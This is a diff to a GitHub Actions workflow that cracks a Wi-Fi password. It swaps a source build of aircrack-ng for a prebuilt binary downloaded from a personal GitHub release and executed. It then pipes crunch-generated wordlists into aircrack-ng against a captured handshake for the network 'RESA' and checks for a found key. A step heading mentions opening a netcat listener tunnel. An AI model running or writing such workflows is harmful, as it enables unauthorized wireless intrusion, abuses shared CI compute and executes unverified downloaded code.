@@ -45,8 +45,6 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y --no-install-recommends \
-            build-essential \
-            gettext libelf-dev \
             git ssh openssh-client curl jq \
             busybox-static netcat-openbsd crunch
 
@@ -54,10 +52,8 @@ jobs:
 
       - name: Install aircrack-ng
         run: |
-          ./autogen.sh
-          ./configure --prefix=`pwd`/install
-          make -j4
-          make install
+          wget https://github.com/SunJangYo12/aircrack-ng/releases/download/v1.0.0/aircrack-ng
+          chmod +x aircrack-ng
 
 
       - name: Buka tunnel Listener nc
@@ -155,8 +151,8 @@ jobs:
           cat .count
           ls -la
 
-          crunch 8 9 abcdefghijklmnopqrstuvwxyz --stdout | timeout -s INT -k 2m 5h \
-            ./install/bin/aircrack-ng -w- mydata/resa.cap -e RESA | tee aircrack_output.log || true
+          crunch 8 9 abcdefghijklmnopqrstuvwxyz --stdout | timeout -s INT -k 2m 2m \
+            ./aircrack-ng -w- mydata/resa.cap -e RESA | tee aircrack_output.log || true
 
           if grep -q "KEY FOUND!" aircrack_output.log; then
             FOUND_KEY=$(grep "KEY FOUND!" aircrack_output.log)
